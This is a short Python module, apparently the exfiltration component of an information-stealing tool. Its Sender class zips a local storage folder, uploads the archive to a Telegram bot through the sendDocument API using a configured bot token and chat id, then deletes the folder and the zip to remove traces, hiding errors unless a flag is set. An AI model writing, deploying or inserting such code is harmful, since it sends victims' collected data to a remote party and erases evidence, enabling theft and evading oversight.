from os import remove
from requests import post
from shutil import make_archive, rmtree

from ..utils.config import SenderConfig


class Sender:

    def __init__(self, *args):

        self.config = SenderConfig()

        for index, variable in enumerate(self.config.Variables):
            self.__dict__.update({variable: args[index]})

    def __create_archive(self):

        make_archive(rf"{self.storage_path}\{self.zip_name}", "zip", rf"{self.storage_path}\{self.storage_folder}")

    def __send_archive(self):

        with open(rf"{self.storage_path}\{self.zip_name}.zip", "rb") as file:

            post(
                url=f"https://api.telegram.org/bot{self.token}/sendDocument",
                data={
                    "chat_id": self.user_id
                },
                files={
                    "document": file
                }
            )

        file.close()

    def __delete_files(self):

        rmtree(rf"{self.storage_path}\{self.storage_folder}")
        remove(rf"{self.storage_path}\{self.zip_name}.zip")

    def run(self):

        try:

            self.__create_archive()
            self.__send_archive()
            self.__delete_files()

        except Exception as e:

            if self.errors is True:
                print(f"[SENDER]: {repr(e)}")
